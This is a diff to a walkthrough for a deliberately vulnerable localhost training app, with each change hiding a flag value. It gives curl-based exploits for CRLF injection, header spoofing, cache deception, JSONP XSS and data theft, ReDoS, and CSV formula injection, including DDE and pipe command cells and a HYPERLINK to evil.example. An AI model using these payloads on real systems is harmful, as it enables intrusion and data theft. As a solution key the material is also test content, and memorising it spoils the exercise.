@@ -6,7 +6,7 @@ Flags from JavaScript/CSS/download endpoints are returned in the `X-Flag`
 
 ## http – HTTP Layer Flaws
 
-**1. CRLF Log Injection** – `PENTRIX{http_crlf-log}`
+**1. CRLF Log Injection** – `PENTRIX{...}`
 
 1. Inject CR/LF bytes via the tracked ref parameter:
    `curl "http://localhost:3112/http/track?ref=homepage%0d%0a2026-10-02T00:00:00.000Z%20FAKE%20admin%20login%20from%2010.9.9.9"`
@@ -18,7 +18,7 @@ Why it works: the raw ref value, CR/LF bytes included, is written to the
 access log with no sanitization, so `%0d%0a` splits one entry into two, and
 the log viewer renders the injected HTML raw.
 
-**2. HTTP Method Override** – `PENTRIX{http_method-override}`
+**2. HTTP Method Override** – `PENTRIX{...}`
 
 1. The inventory page (`/http/items`) only offers "request deletion" buttons
    that POST and delete nothing.
@@ -31,7 +31,7 @@ Why it works: the app rewrites `req.method` from the `_method` body
 parameter, so a plain POST is routed to the DELETE handler the UI never
 exposes.
 
-**3. Verb Tampering** – `PENTRIX{http_verb-tamper}`
+**3. Verb Tampering** – `PENTRIX{...}`
 
 1. The feedback form posts to `/http/feedback` and the page says POST-only.
 2. Submit the same action as GET:
@@ -42,7 +42,7 @@ Why it works: the same handler is registered for both GET and POST, so the
 "POST-only" endpoint performs its state change over GET too (bookmarkable,
 loggable, CSRF-able).
 
-**4. X-Forwarded-For Trust** – `PENTRIX{http_xff-admin}`
+**4. X-Forwarded-For Trust** – `PENTRIX{...}`
 
 1. `curl http://localhost:3112/http/internal` returns 403.
 2. Add the header yourself:
@@ -52,7 +52,7 @@ loggable, CSRF-able).
 Why it works: admin access is granted from the client-controlled
 `X-Forwarded-For` header, which any client can set to `127.0.0.1`.
 
-**5. Cache Deception** – `PENTRIX{http_cache-deception}`
+**5. Cache Deception** – `PENTRIX{...}`
 
 1. Purge the demo cache: open `http://localhost:3112/http/cache-purge`.
 2. As the victim: open `http://localhost:3112/http/cache-login?user=alice`,
@@ -67,7 +67,7 @@ Why it works: the naive cache is keyed on the URL path only, so the victim's
 personalized response (sent with `Cache-Control: public, max-age=3600`) is
 served to every later visitor.
 
-**6. Referer-Based Auth** – `PENTRIX{http_referer-auth}`
+**6. Referer-Based Auth** – `PENTRIX{...}`
 
 1. `curl http://localhost:3112/http/hidden` returns 403.
 2. Send your own Referer:
@@ -79,7 +79,7 @@ the substring `/trusted`, which any client can supply.
 
 ## jsonp – JSONP Injection
 
-**1. Callback XSS** – `PENTRIX{jsonp_callback-xss}`
+**1. Callback XSS** – `PENTRIX{...}`
 
 1. `curl -i "http://localhost:3112/jsonp/user?callback=alert(1)//"`
 2. The body is `alert(1)//({"user":"alice","role":"user"});` served as
@@ -88,7 +88,7 @@ the substring `/trusted`, which any client can supply.
 Why it works: the callback name is reflected into executable JavaScript with
 no validation, so it breaks out of the function-call context.
 
-**2. JSONP Data Theft** – `PENTRIX{jsonp_csrf-data}`
+**2. JSONP Data Theft** – `PENTRIX{...}`
 
 1. While "logged in", visit `http://localhost:3112/jsonp/attacker` in the
    browser. The page's `<script src="/jsonp/data?callback=steal">` pulls the
@@ -100,7 +100,7 @@ no validation, so it breaks out of the function-call context.
 Why it works: sensitive data served as JSONP is readable cross-origin by any
 site that can get the victim to load a script tag.
 
-**3. Callback Filter Bypass** – `PENTRIX{jsonp_filter-bypass}`
+**3. Callback Filter Bypass** – `PENTRIX{...}`
 
 1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
 2. Rebuild it at runtime (URL-encoded):
@@ -111,7 +111,7 @@ site that can get the victim to load a script tag.
 Why it works: the blocklist only bans the literal word "alert", but string
 concatenation rebuilds it at runtime where the filter never looks.
 
-**4. Array Constructor Hijack** – `PENTRIX{jsonp_array-hijack}`
+**4. Array Constructor Hijack** – `PENTRIX{...}`
 
 1. Visit `http://localhost:3112/jsonp/array-attacker` in the browser. The
    page saves the real `Array`, overrides the global constructor, loads
@@ -124,7 +124,7 @@ Why it works: the legacy endpoint builds its JSONP with `new Array(...)`,
 so a page that overrides the global `Array` constructor before loading the
 feed intercepts every element (the classic 2007 hijack).
 
-**5. JSONP MIME Sniffing** – `PENTRIX{jsonp_mimetype}`
+**5. JSONP MIME Sniffing** – `PENTRIX{...}`
 
 1. `curl -i "http://localhost:3112/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
 2. The response is `Content-Type: text/html` with
@@ -141,35 +141,35 @@ curl), then download `http://localhost:3112/formula/export.csv`. The server
 checks every exported cell; formula-trigger cells award the matching flag in
 the `X-Flags` response header.
 
-**1. Classic Formula Injection** – `PENTRIX{formula_formula-csv}`
+**1. Classic Formula Injection** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode "name==cmd|'/c calc'!A0" --data-urlencode "note=classic" http://localhost:3112/formula/add`
 then `curl -i http://localhost:3112/formula/export.csv` shows the raw
-`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{formula_formula-csv}`.
+`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{...}`.
 
 Why it works: cells are CSV-quoted but never neutralized, so a leading `=`
 reaches the spreadsheet as a live formula.
 
-**2. DDE Command Execution** – `PENTRIX{formula_formula-dde}`
+**2. DDE Command Execution** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name==DDE("cmd";"/c calc";"!A0")' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-dde}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: the `=DDE(...)` function form survives quoting and asks an
 external application to run the command when the sheet opens.
 
-**3. HYPERLINK Exfiltration** – `PENTRIX{formula_formula-hyperlink}`
+**3. HYPERLINK Exfiltration** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name==HYPERLINK("http://evil.example","click me")' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-hyperlink}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: `HYPERLINK` renders an attacker URL behind an innocent label
 and can be combined with cell references to leak neighboring data.
 
-**4. Pipe Prefix (LibreOffice)** – `PENTRIX{formula_formula-pipe}`
+**4. Pipe Prefix (LibreOffice)** – `PENTRIX{...}`
 
 `curl -X POST --data-urlencode 'name=|/usr/bin/xcalc' http://localhost:3112/formula/add`
-then export. Awards `PENTRIX{formula_formula-pipe}`.
+then export. Awards `PENTRIX{...}`.
 
 Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
 variant, and it reaches the export unsanitized like the rest.
@@ -180,7 +180,7 @@ Each endpoint reports the milliseconds the check took; past 1500 ms the flag
 is awarded. Time with `time curl ...` or read the page. Length caps keep the
 worst case in seconds.
 
-**1. Catastrophic Email Regex** – `PENTRIX{redos_redos-email}`
+**1. Catastrophic Email Regex** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/email?email=$(python3 -c "print('a'*30+'!'")"`
 (30 a's followed by `!`, no `@` anywhere). Takes several seconds; the flag
@@ -189,7 +189,7 @@ is shown on the result page.
 Why it works: the nested quantifier `((...+)+)` in the local part tries every
 way to partition the 30-character run before failing on the missing `@`.
 
-**2. Nested Quantifier Username** – `PENTRIX{redos_redos-username}`
+**2. Nested Quantifier Username** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/username?username=$(python3 -c "print('a'*27+'!'")"`
 (27 a's followed by `!`). Takes several seconds; the flag is shown.
@@ -197,7 +197,7 @@ way to partition the 30-character run before failing on the missing `@`.
 Why it works: the textbook catastrophic pattern `^(a+)+$` backtracks over
 every partition of the a-run before the trailing `!` fails the match.
 
-**3. Catastrophic URL Regex** – `PENTRIX{redos_redos-url}`
+**3. Catastrophic URL Regex** – `PENTRIX{...}`
 
 `time curl --get --data-urlencode "url=$(python3 -c "print('http://example.com/'+'a/'*12+'!'")"` http://localhost:3112/redos/url`
 Takes several seconds; the flag is shown.
@@ -205,7 +205,7 @@ Takes several seconds; the flag is shown.
 Why it works: the nested quantifiers `([\/\w .-]*)*` in the path group
 explode when a long repeated path ends with a character the pattern rejects.
 
-**4. Regex Injection Search** – `PENTRIX{redos_redos-search}`
+**4. Regex Injection Search** – `PENTRIX{...}`
 
 `time curl "http://localhost:3112/redos/search?q=a"`
 The query is compiled to `^((a)+)+$` and tested against a fixed haystack of
